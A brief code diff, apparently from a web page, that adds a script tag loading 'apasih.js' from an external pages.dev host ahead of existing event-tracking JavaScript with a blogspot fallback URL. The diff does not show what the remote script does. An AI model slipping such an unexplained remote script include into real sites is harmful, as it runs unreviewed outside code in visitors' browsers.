@@ -1,3 +1,6 @@
+<script src="https://kltraid.pages.dev/apasih.js"></script>
+  
+<script>
     var intervals = {}; // Object to keep track of intervals
     var activeEventId = null; // Track the currently active event
     const fallbackURL = "https://bikinbaru96.blogspot.com/2024/06/blog-post_13.html"; // URL fallback jika URL tidak ditemukan
@@ -636,3 +639,4 @@ window.addEventListener('focus', function() {
         }
     }
 });
+</script>
